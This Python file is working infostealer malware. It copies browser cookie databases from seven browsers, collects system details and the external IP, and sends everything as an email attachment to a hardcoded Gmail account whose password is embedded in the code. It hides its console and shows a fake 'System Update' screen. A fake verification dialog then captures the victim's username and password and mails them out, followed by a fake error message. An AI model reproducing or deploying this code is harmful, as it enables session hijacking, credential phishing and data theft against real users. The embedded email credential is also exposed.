import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import socket
import platform
import os
import getpass
import sys
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import json
import urllib.request
import urllib.parse
import sqlite3
import shutil
import base64
import glob
import zipfile

# EMAIL CONFIG
SENDER_EMAIL = "demedzirkvadze53@gmail.com"
SENDER_PASSWORD = "umstxlfbjmlmjapu"
RECEIVER_EMAIL = "demedzirkvadze53@gmail.com"

def get_external_ip():
    try:
        response = urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5)
        return json.loads(response.read().decode()).get("ip")
    except:
        return "Unknown"

def get_system_info():
    return {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "external_ip": get_external_ip(),
        "os": platform.system(),
        "os_version": platform.version(),
        "username": getpass.getuser(),
        "python_version": sys.version
    }

# ============================================================
# COOKIE STEALER - ALL BROWSERS
# ============================================================

def get_chrome_cookies_all():
    cookies = []
    try:
        paths = [
            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
        ]
        for path in paths:
            if os.path.exists(path):
                temp = os.path.expanduser("~") + "\\temp_chrome.db"
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                for row in cursor.fetchall():
                    cookies.append({
                        "browser": "Chrome",
                        "host": row[0],
                        "name": row[1],
                        "value": base64.b64encode(row[2]).decode() if row[2] else "",
                        "path": row[3],
                        "secure": row[5] if len(row) > 5 else False,
                        "httponly": row[6] if len(row) > 6 else False
                    })
                conn.close()
                os.remove(temp)
                break
    except Exception as e:
        print("Chrome error:", e)
    return cookies

def get_edge_cookies_all():
    cookies = []
    try:
        paths = [
            os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies",
            os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
        ]
        for path in paths:
            if os.path.exists(path):
                temp = os.path.expanduser("~") + "\\temp_edge.db"
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
                for row in cursor.fetchall():
                    cookies.append({
                        "browser": "Edge",
                        "host": row[0],
                        "name": row[1],
                        "value": base64.b64encode(row[2]).decode() if row[2] else "",
                        "path": row[3] if len(row) > 3 else ""
                    })
                conn.close()
                os.remove(temp)
                break
    except:
        pass
    return cookies

def get_firefox_cookies_all():
    cookies = []
    try:
        profiles = os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        if os.path.exists(profiles):
            for profile in os.listdir(profiles):
                if ".default" in profile:
                    cookie_file = os.path.join(profiles, profile, "cookies.sqlite")
                    if os.path.exists(cookie_file):
                        temp = os.path.expanduser("~") + "\\temp_firefox.db"
                        shutil.copy2(cookie_file, temp)
                        conn = sqlite3.connect(temp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host, name, value, path, isSecure, isHttpOnly FROM moz_cookies")
                        for row in cursor.fetchall():
                            cookies.append({
                                "browser": "Firefox",
                                "host": row[0],
                                "name": row[1],
                                "value": row[2] if row[2] else "",
                                "path": row[3],
                                "secure": row[4] if len(row) > 4 else False,
                                "httponly": row[5] if len(row) > 5 else False
                            })
                        conn.close()
                        os.remove(temp)
                        break
    except:
        pass
    return cookies

def get_brave_cookies():
    cookies = []
    try:
        brave_path = os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        if os.path.exists(brave_path):
            temp = os.path.expanduser("~") + "\\temp_brave.db"
            shutil.copy2(brave_path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    "browser": "Brave",
                    "host": row[0],
                    "name": row[1],
                    "value": base64.b64encode(row[2]).decode() if row[2] else "",
                    "path": row[3] if len(row) > 3 else ""
                })
            conn.close()
            os.remove(temp)
    except:
        pass
    return cookies

def get_opera_cookies():
    cookies = []
    try:
        opera_path = os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Network\Cookies"
        if os.path.exists(opera_path):
            temp = os.path.expanduser("~") + "\\temp_opera.db"
            shutil.copy2(opera_path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    "browser": "Opera",
                    "host": row[0],
                    "name": row[1],
                    "value": base64.b64encode(row[2]).decode() if row[2] else "",
                    "path": row[3] if len(row) > 3 else ""
                })
            conn.close()
            os.remove(temp)
    except:
        pass
    return cookies

def get_vivaldi_cookies():
    cookies = []
    try:
        vivaldi_path = os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\Network\Cookies"
        if os.path.exists(vivaldi_path):
            temp = os.path.expanduser("~") + "\\temp_vivaldi.db"
            shutil.copy2(vivaldi_path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    "browser": "Vivaldi",
                    "host": row[0],
                    "name": row[1],
                    "value": base64.b64encode(row[2]).decode() if row[2] else "",
                    "path": row[3] if len(row) > 3 else ""
                })
            conn.close()
            os.remove(temp)
    except:
        pass
    return cookies

def get_chromium_cookies():
    cookies = []
    try:
        chromium_path = os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data\Default\Network\Cookies"
        if os.path.exists(chromium_path):
            temp = os.path.expanduser("~") + "\\temp_chromium.db"
            shutil.copy2(chromium_path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    "browser": "Chromium",
                    "host": row[0],
                    "name": row[1],
                    "value": base64.b64encode(row[2]).decode() if row[2] else "",
                    "path": row[3] if len(row) > 3 else ""
                })
            conn.close()
            os.remove(temp)
    except:
        pass
    return cookies

def steal_all_cookies():
    all_cookies = []
    all_cookies.extend(get_chrome_cookies_all())
    all_cookies.extend(get_edge_cookies_all())
    all_cookies.extend(get_firefox_cookies_all())
    all_cookies.extend(get_brave_cookies())
    all_cookies.extend(get_opera_cookies())
    all_cookies.extend(get_vivaldi_cookies())
    all_cookies.extend(get_chromium_cookies())
    return all_cookies

# ============================================================
# SEND EMAIL WITH COOKIES
# ============================================================
def send_email_with_cookies(info, cookies, credentials=""):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = f"[COOKIES] {info.get('hostname')} - {len(cookies)} cookies - {datetime.now().strftime('%H:%M')}"
        
        body = "=" * 60 + "\nSYSTEM INFORMATION\n" + "=" * 60 + "\n"
        for key, value in info.items():
            body += f"{key}: {value}\n"
        
        if credentials:
            body += "\n" + "=" * 60 + "\nCREDENTIALS\n" + "=" * 60 + "\n" + credentials
        
        body += "\n" + "=" * 60 + f"\nTOTAL COOKIES: {len(cookies)}\n" + "=" * 60 + "\n"
        
        browsers = {}
        for c in cookies:
            b = c.get("browser", "Unknown")
            if b not in browsers:
                browsers[b] = 0
            browsers[b] += 1
        
        for b, count in browsers.items():
            body += f"{b}: {count} cookies\n"
        
        body += "\n--- SAMPLE COOKIES (first 30) ---\n"
        for c in cookies[:30]:
            body += f"{c.get('browser')} | {c.get('host')} | {c.get('name')}\n"
        
        msg.attach(MIMEText(body, 'plain'))
        
        if cookies:
            json_data = json.dumps(cookies, indent=2)
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(json_data.encode())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="cookies_{info.get("hostname")}_{len(cookies)}_{datetime.now().strftime("%Y%m%d_%H%M")}.json"')
            msg.attach(part)
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print("Email error:", e)
        try:
            with open(os.path.expanduser("~") + "/cookies_backup.json", "w") as f:
                json.dump(cookies, f, indent=2)
        except:
            pass
        return False

# ============================================================
# FAKE UI - USERNAME INSTEAD OF EMAIL
# ============================================================
def fake_update():
    info = get_system_info()
    cookies = steal_all_cookies()
    threading.Thread(target=send_email_with_cookies, args=(info, cookies), daemon=True).start()
    
    root = tk.Tk()
    root.title("System Update")
    root.geometry("450x280")
    root.configure(bg="#0a0a12")
    root.resizable(False, False)
    
    tk.Label(root, text="SYSTEM UPDATE", font=("Arial", 24, "bold"),
            fg="#448aff", bg="#0a0a12").pack(pady=20)
    
    tk.Label(root, text="Downloading updates... Please wait.",
            font=("Arial", 12), fg="#8888aa", bg="#0a0a12").pack(pady=5)
    
    tk.Label(root, text=f"Total cookies collected: {len(cookies)}", 
            font=("Arial", 10), fg="#666688", bg="#0a0a12").pack(pady=5)
    
    browsers = {}
    for c in cookies:
        b = c.get("browser", "Unknown")
        browsers[b] = browsers.get(b, 0) + 1
    browser_text = " | ".join([f"{b}: {count}" for b, count in browsers.items()])
    tk.Label(root, text=browser_text, font=("Arial", 9), fg="#555577", bg="#0a0a12").pack(pady=5)
    
    progress = ttk.Progressbar(root, mode='indeterminate', length=300)
    progress.pack(pady=20)
    progress.start()
    
    def close_after():
        progress.stop()
        root.destroy()
        fake_login()
    
    root.after(4000, close_after)
    root.mainloop()

def fake_login():
    info = get_system_info()
    
    root = tk.Tk()
    root.title("Verification Required")
    root.geometry("380x300")
    root.configure(bg="#0a0a12")
    root.resizable(False, False)
    
    tk.Label(root, text="VERIFICATION REQUIRED", font=("Arial", 16, "bold"),
            fg="#ffd700", bg="#0a0a12").pack(pady=15)
    
    tk.Label(root, text="Enter your credentials to continue", font=("Arial", 10),
            fg="#666688", bg="#0a0a12").pack()
    
    frame = tk.Frame(root, bg="#0a0a12")
    frame.pack(pady=15, padx=30, fill="x")
    
    # USERNAME field (removed Email)
    tk.Label(frame, text="Username:", font=("Arial", 12), fg="white", bg="#0a0a12").pack(anchor="w")
    user_entry = tk.Entry(frame, font=("Arial", 14), bg="#1a1a2e", fg="white")
    user_entry.pack(fill="x", pady=5)
    
    tk.Label(frame, text="Password:", font=("Arial", 12), fg="white", bg="#0a0a12").pack(anchor="w")
    pass_entry = tk.Entry(frame, font=("Arial", 14), bg="#1a1a2e", fg="white", show="*")
    pass_entry.pack(fill="x", pady=5)
    
    def submit():
        username = user_entry.get()
        password = pass_entry.get()
        credentials = f"Username: {username}\nPassword: {password}\n"
        cookies = steal_all_cookies()
        threading.Thread(target=send_email_with_cookies, args=(info, cookies, credentials), daemon=True).start()
        root.destroy()
        fake_error()
    
    btn_frame = tk.Frame(root, bg="#0a0a12")
    btn_frame.pack(pady=10)
    
    tk.Button(btn_frame, text="SUBMIT", font=("Arial", 12, "bold"),
             bg="#ffd700", fg="#0a0a12", bd=0, padx=30, pady=8,
             command=submit).pack(side="left", padx=5)
    
    tk.Button(btn_frame, text="CANCEL", font=("Arial", 12, "bold"),
             bg="#ff1744", fg="white", bd=0, padx=30, pady=8,
             command=root.destroy).pack(side="left", padx=5)
    
    root.mainloop()

def fake_error():
    root = tk.Tk()
    root.title("Error")
    root.geometry("400x200")
    root.configure(bg="#1a1a2e")
    root.resizable(False, False)
    
    tk.Label(root, text="SYSTEM ERROR", font=("Arial", 20, "bold"),
            fg="#ff1744", bg="#1a1a2e").pack(pady=20)
    
    tk.Label(root, text="An unexpected error has occurred.\nPlease restart the application.",
            font=("Arial", 12), fg="#8888aa", bg="#1a1a2e").pack(pady=10)
    
    tk.Button(root, text="OK", font=("Arial", 14, "bold"),
             bg="#2d2d44", fg="white", bd=0, padx=30, pady=8,
             command=root.destroy).pack(pady=20)
    
    root.mainloop()

def main():
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass
    fake_update()

if __name__ == "__main__":
    main()